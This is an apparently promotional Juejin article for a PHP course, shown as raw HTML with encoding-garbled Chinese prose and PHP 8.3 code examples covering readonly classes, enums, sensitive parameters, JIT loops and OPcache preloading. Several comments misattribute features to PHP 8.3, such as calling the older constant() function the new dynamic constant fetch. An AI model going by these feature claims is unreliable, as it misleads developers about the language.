 <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597243334176555048" data-draft-id="7597025960946892835" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PHPå¼€å‘è€…è®­ç»ƒè¥ ä»å…¥é—¨åˆ°ç²¾é€š"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T09:37:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·557744506908"/> <meta itemprop="url" content="https://juejin.cn/user/749198160955433"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PHPå¼€å‘è€…è®­ç»ƒè¥ ä»å…¥é—¨åˆ°ç²¾é€š
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/749198160955433/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·557744506908
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:37:58.000Z" title="Tue Jan 20 2026 09:37:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>PHPå¼€å‘è€…è®­ç»ƒè¥ ä»å…¥é—¨åˆ°ç²¾é€š---youkeit.xyz/15490/</strong></p>
<h2 data-id="heading-0">PHP å¼€å‘è€…è®­ç»ƒè¥ï¼šä»å…¥é—¨åˆ°ç²¾é€šï¼Œæ‹¥æŠ± PHP 8.3 + ä¸ Swooleï¼ŒæŠ¢å ä¸‹ä¸€ä»£ Web å¼€å‘å…ˆæœº</h2>
<h3 data-id="heading-1">ä¸€ã€PHP 8.3 ç°ä»£è¯­æ³•ä¸ç±»å‹ç³»ç»Ÿæ·±åº¦è§£æ</h3>
<h4 data-id="heading-2">1.1 åªè¯»ç±»ä¸æ·±æ‹·è´æœºåˆ¶</h4>
<p>PHP 8.3 åœ¨é¢å‘å¯¹è±¡ç¼–ç¨‹æ–¹é¢å¼•å…¥äº†é©å‘½æ€§çš„æ”¹è¿›ï¼Œåªè¯»ç±»ï¼ˆReadonly Classesï¼‰å’Œæ·±æ‹·è´æœºåˆ¶æ˜¾è‘—æå‡äº†ä»£ç çš„å®‰å…¨æ€§å’Œå¯é¢„æµ‹æ€§ã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">ModernPHP</span>\<span class="hljs-title class_">Types</span>;

<span class="hljs-comment">/**
 * PHP 8.3 åªè¯»ç±»ç¤ºä¾‹
 * ä¸€æ—¦åˆå§‹åŒ–ï¼Œæ‰€æœ‰å±æ€§ä¸å¯æ›´æ”¹
 */</span>
<span class="hljs-keyword">readonly</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ImmutableUser</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$uuid</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$username</span>,
        <span class="hljs-keyword">public</span> Email <span class="hljs-variable">$email</span>,
        <span class="hljs-keyword">public</span> DateTimeImmutable <span class="hljs-variable">$createdAt</span>,
        <span class="hljs-keyword">public</span> UserProfile <span class="hljs-variable">$profile</span>
    </span>) </span>{}
    
    <span class="hljs-comment">/**
     * åˆ›å»ºå‰¯æœ¬å¹¶ä¿®æ”¹éƒ¨åˆ†å±æ€§
     * PHP 8.3 æ”¯æŒæ·±æ‹·è´
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withUsername</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$newUsername</span></span>): <span class="hljs-title">self</span>
    </span>{
        <span class="hljs-comment">// __clone ç°åœ¨æ”¯æŒæ·±æ‹·è´ä¿®æ”¹</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">self</span>(
            <span class="hljs-variable language_">$this</span>-&gt;uuid,
            <span class="hljs-variable">$newUsername</span>,
            <span class="hljs-keyword">clone</span> <span class="hljs-variable language_">$this</span>-&gt;email,
            <span class="hljs-keyword">clone</span> <span class="hljs-variable language_">$this</span>-&gt;createdAt,
            <span class="hljs-keyword">clone</span> <span class="hljs-variable language_">$this</span>-&gt;profile
        );
    }
    
    <span class="hljs-comment">/**
     * éªŒè¯å™¨ä½¿ç”¨æ–°å¢çš„ json_validate() å‡½æ•°
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fromJson</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$json</span></span>): <span class="hljs-title">self</span>
    </span>{
        <span class="hljs-comment">// PHP 8.3 æ–°å¢ï¼Œæ€§èƒ½ä¼˜äº json_decode</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">json_validate</span>(<span class="hljs-variable">$json</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Invalid JSON'</span>);
        }
        
        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">512</span>, JSON_THROW_ON_ERROR);
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">self</span>(
            <span class="hljs-variable">$data</span>[<span class="hljs-string">'uuid'</span>] ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Missing uuid'</span>),
            <span class="hljs-variable">$data</span>[<span class="hljs-string">'username'</span>] ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Missing username'</span>),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Email</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">'email'</span>] ?? <span class="hljs-string">''</span>),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateTimeImmutable</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">'created_at'</span>] ?? <span class="hljs-string">'now'</span>),
            <span class="hljs-title class_">UserProfile</span>::<span class="hljs-title function_ invoke__">fromArray</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">'profile'</span>] ?? [])
        );
    }
}

<span class="hljs-comment">/**
 * æšä¸¾å¢å¼º
 */</span>
<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">UserStatus</span>: <span class="hljs-title">string</span>
</span>{
    <span class="hljs-keyword">case</span> ACTIVE = <span class="hljs-string">'active'</span>;
    <span class="hljs-keyword">case</span> INACTIVE = <span class="hljs-string">'inactive'</span>;
    <span class="hljs-keyword">case</span> SUSPENDED = <span class="hljs-string">'suspended'</span>;
    <span class="hljs-keyword">case</span> DELETED = <span class="hljs-string">'deleted'</span>;
    
    <span class="hljs-comment">// PHP 8.3 æšä¸¾æ–¹æ³•å¯ä»¥è¿”å›å¸¸é‡è¡¨è¾¾å¼</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">color</span>(<span class="hljs-params"/>): <span class="hljs-title">string</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>(<span class="hljs-variable language_">$this</span>) {
            <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">ACTIVE</span> =&gt; <span class="hljs-string">'#22c55e'</span>,
            <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">INACTIVE</span> =&gt; <span class="hljs-string">'#f59e0b'</span>,
            <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">SUSPENDED</span> =&gt; <span class="hljs-string">'#ef4444'</span>,
            <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">DELETED</span> =&gt; <span class="hljs-string">'#6b7280'</span>,
        };
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">canLogin</span>(<span class="hljs-params"/>): <span class="hljs-title">bool</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>(<span class="hljs-variable language_">$this</span>) {
            <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">ACTIVE</span> =&gt; <span class="hljs-literal">true</span>,
            <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">INACTIVE</span> =&gt; <span class="hljs-literal">false</span>,
            <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">SUSPENDED</span> =&gt; <span class="hljs-literal">false</span>,
            <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">DELETED</span> =&gt; <span class="hljs-literal">false</span>,
        };
    }
}

<span class="hljs-comment">/**
 * æ•æ„Ÿå‚æ•°å±æ€§
 */</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserAuthenticator</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">authenticate</span>(<span class="hljs-params">
        <span class="hljs-keyword">string</span> <span class="hljs-variable">$username</span>,
        #[\SensitiveParameter] <span class="hljs-keyword">string</span> <span class="hljs-variable">$password</span>,
        #[\SensitiveParameter] <span class="hljs-keyword">string</span> <span class="hljs-variable">$token</span>
    </span>): <span class="hljs-title">AuthResult</span> </span>{
        <span class="hljs-comment">// å¯†ç å’Œä»¤ç‰Œåœ¨å †æ ˆè·Ÿè¸ªä¸­ä¼šè¢«éšè—</span>
        <span class="hljs-comment">// å¢å¼ºå®‰å…¨æ€§</span>
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">performAuth</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$token</span>);
        } <span class="hljs-keyword">catch</span> (AuthenticationException <span class="hljs-variable">$e</span>) {
            <span class="hljs-comment">// å¼‚å¸¸å †æ ˆä¸­ä¸ä¼šæ˜¾ç¤ºæ•æ„Ÿå‚æ•°</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-variable">$e</span>;
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">performAuth</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$username</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$password</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$token</span></span>): <span class="hljs-title">AuthResult</span>
    </span>{
        <span class="hljs-comment">// è®¤è¯é€»è¾‘</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AuthResult</span>();
    }
}

<span class="hljs-comment">/**
 * åŠ¨æ€ç±»å¸¸é‡è·å–
 */</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Configuration</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">string</span> API_VERSION = <span class="hljs-string">'1.0.0'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">int</span> MAX_RETRIES = <span class="hljs-number">3</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">float</span> TIMEOUT = <span class="hljs-number">30.0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getConstant</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">mixed</span>
    </span>{
        <span class="hljs-comment">// PHP 8.3 å…è®¸åŠ¨æ€è·å–ç±»å¸¸é‡</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable language_">class</span> . <span class="hljs-string">'::'</span> . <span class="hljs-variable">$name</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">"Constant <span class="hljs-subst">{$name}</span> not defined"</span>);
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">constant</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable language_">class</span> . <span class="hljs-string">'::'</span> . <span class="hljs-variable">$name</span>);
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImmutableUser</span>(
    uuid: <span class="hljs-string">'550e8400-e29b-41d4-a716-446655440000'</span>,
    username: <span class="hljs-string">'john_doe'</span>,
    email: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Email</span>(<span class="hljs-string">'john@example.com'</span>),
    createdAt: <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateTimeImmutable</span>(),
    profile: <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProfile</span>()
);

<span class="hljs-comment">// ä¸å¯å˜å¯¹è±¡ï¼Œè¿™è¡Œä¼šæŠ¥é”™</span>
<span class="hljs-comment">// $user-&gt;username = 'new_name'; // Error: Cannot modify readonly property</span>

<span class="hljs-comment">// æ­£ç¡®çš„æ–¹å¼æ˜¯åˆ›å»ºæ–°å®ä¾‹</span>
<span class="hljs-variable">$updatedUser</span> = <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">withUsername</span>(<span class="hljs-string">'new_name'</span>);
</code></pre>
<h4 data-id="heading-3">1.2 JIT ç¼–è¯‘ä¸æ€§èƒ½ä¼˜åŒ–å®æˆ˜</h4>
<p>PHP 8.3 è¿›ä¸€æ­¥ä¼˜åŒ–äº† JIT ç¼–è¯‘å™¨ï¼Œç‰¹åˆ«æ˜¯åœ¨æ•°å­¦è®¡ç®—å’Œæ•°æ®å¤„ç†æ–¹é¢è¡¨ç°å“è¶Šã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">ModernPHP</span>\<span class="hljs-title class_">Performance</span>;

<span class="hljs-comment">/**
 * JIT ä¼˜åŒ–ç¤ºä¾‹ - æ•°å€¼è®¡ç®—
 */</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JitOptimizedCalculator</span>
</span>{
    <span class="hljs-comment">/**
     * ä½¿ç”¨ JIT ä¼˜åŒ–çš„æ•°å­¦è®¡ç®—
     * å¯¹äºå¾ªç¯å¯†é›†å‹è®¡ç®—ï¼ŒJIT å¯ä»¥æå‡ 2-3 å€æ€§èƒ½
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calculateStatisticalData</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-comment">// å¯ç”¨ JIT ä¼˜åŒ–çš„ä»£ç å—</span>
        <span class="hljs-variable">$sum</span> = <span class="hljs-number">0.0</span>;
        <span class="hljs-variable">$count</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$data</span>);
        <span class="hljs-variable">$squares</span> = <span class="hljs-number">0.0</span>;
        
        <span class="hljs-comment">// è¿™ä¸ªå¾ªç¯ä¼šè¢« JIT ç¼–è¯‘ä¼˜åŒ–</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$count</span>; <span class="hljs-variable">$i</span>++) {
            <span class="hljs-variable">$value</span> = (<span class="hljs-keyword">float</span>)<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>];
            <span class="hljs-variable">$sum</span> += <span class="hljs-variable">$value</span>;
            <span class="hljs-variable">$squares</span> += <span class="hljs-variable">$value</span> * <span class="hljs-variable">$value</span>;
        }
        
        <span class="hljs-variable">$mean</span> = <span class="hljs-variable">$sum</span> / <span class="hljs-variable">$count</span>;
        <span class="hljs-variable">$variance</span> = <span class="hljs-variable">$squares</span> / <span class="hljs-variable">$count</span> - <span class="hljs-variable">$mean</span> * <span class="hljs-variable">$mean</span>;
        <span class="hljs-variable">$stdDev</span> = <span class="hljs-title function_ invoke__">sqrt</span>(<span class="hljs-variable">$variance</span>);
        
        <span class="hljs-keyword">return</span> [
            <span class="hljs-string">'mean'</span> =&gt; <span class="hljs-variable">$mean</span>,
            <span class="hljs-string">'variance'</span> =&gt; <span class="hljs-variable">$variance</span>,
            <span class="hljs-string">'std_dev'</span> =&gt; <span class="hljs-variable">$stdDev</span>,
            <span class="hljs-string">'sum'</span> =&gt; <span class="hljs-variable">$sum</span>,
            <span class="hljs-string">'count'</span> =&gt; <span class="hljs-variable">$count</span>
        ];
    }
    
    <span class="hljs-comment">/**
     * çŸ©é˜µè¿ç®—ä¼˜åŒ–
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">matrixMultiply</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$a</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$b</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-variable">$rowsA</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$a</span>);
        <span class="hljs-variable">$colsA</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]);
        <span class="hljs-variable">$colsB</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$b</span>[<span class="hljs-number">0</span>]);
        
        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">array_fill</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$rowsA</span>, <span class="hljs-title function_ invoke__">array_fill</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$colsB</span>, <span class="hljs-number">0</span>));
        
        <span class="hljs-comment">// JIT æ˜¾è‘—åŠ é€Ÿä¸‰é‡å¾ªç¯</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$rowsA</span>; <span class="hljs-variable">$i</span>++) {
            <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt; <span class="hljs-variable">$colsB</span>; <span class="hljs-variable">$j</span>++) {
                <span class="hljs-variable">$sum</span> = <span class="hljs-number">0</span>;
                <span class="hljs-keyword">for</span> (<span class="hljs-variable">$k</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$k</span> &lt; <span class="hljs-variable">$colsA</span>; <span class="hljs-variable">$k</span>++) {
                    <span class="hljs-variable">$sum</span> += <span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>][<span class="hljs-variable">$k</span>] * <span class="hljs-variable">$b</span>[<span class="hljs-variable">$k</span>][<span class="hljs-variable">$j</span>];
                }
                <span class="hljs-variable">$result</span>[<span class="hljs-variable">$i</span>][<span class="hljs-variable">$j</span>] = <span class="hljs-variable">$sum</span>;
            }
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;
    }
}

<span class="hljs-comment">/**
 * å†…å­˜ä¼˜åŒ–ä¸ OPcache é¢„åŠ è½½
 */</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OptimizedDataProcessor</span>
</span>{
    <span class="hljs-comment">// é¢„åŠ è½½çš„é…ç½®æ•°æ®</span>
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$preloadedConfig</span>;
    
    <span class="hljs-comment">/**
     * åˆå§‹åŒ–æ—¶é¢„åŠ è½½æ•°æ®åˆ° OPcache
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">preload</span>(<span class="hljs-params"/>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-comment">// è¿™äº›æ•°æ®ä¼šè¢«é¢„åŠ è½½åˆ°å†…å­˜ä¸­</span>
        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$preloadedConfig</span> = [
            <span class="hljs-string">'settings'</span> =&gt; <span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/config/settings.php'</span>,
            <span class="hljs-string">'routes'</span> =&gt; <span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/config/routes.php'</span>,
            <span class="hljs-string">'services'</span> =&gt; <span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/config/services.php'</span>,
        ];
        
        <span class="hljs-comment">// é¢„çƒ­å¸¸ç”¨ç±»</span>
        <span class="hljs-title function_ invoke__">opcache_compile_file</span>(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/Calculator.php'</span>);
        <span class="hljs-title function_ invoke__">opcache_compile_file</span>(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/Validator.php'</span>);
        <span class="hljs-title function_ invoke__">opcache_compile_file</span>(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/Transformer.php'</span>);
    }
    
    <span class="hljs-comment">/**
     * ä½¿ç”¨é¢„åŠ è½½æ•°æ®
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">processWithPreloadedData</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$input</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-comment">// é›¶æˆæœ¬è®¿é—®é¢„åŠ è½½æ•°æ®</span>
        <span class="hljs-variable">$settings</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable">$preloadedConfig</span>[<span class="hljs-string">'settings'</span>];
        
        <span class="hljs-comment">// æ•°æ®å¤„ç†é€»è¾‘</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">transformData</span>(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$settings</span>);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transformData</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$input</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$settings</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-comment">// æ•°æ®å¤„ç†é€»è¾‘</span>
        <span class="hljs-keyword">return</span> [
            <span class="hljs-string">'processed'</span> =&gt; <span class="hljs-literal">true</span>,
            <span class="hljs-string">'data'</span> =&gt; <span class="hljs-variable">$input</span>,
            <span class="hljs-string">'settings'</span> =&gt; <span class="hljs-variable">$settings</span>
        ];
    }
}

<span class="hljs-comment">// åœ¨ preload.php ä¸­</span>
<span class="hljs-comment">/*
opcache_compile_file('vendor/autoload.php');
opcache_compile_file('src/OptimizedDataProcessor.php');
*/</span>

<span class="hljs-comment">/**
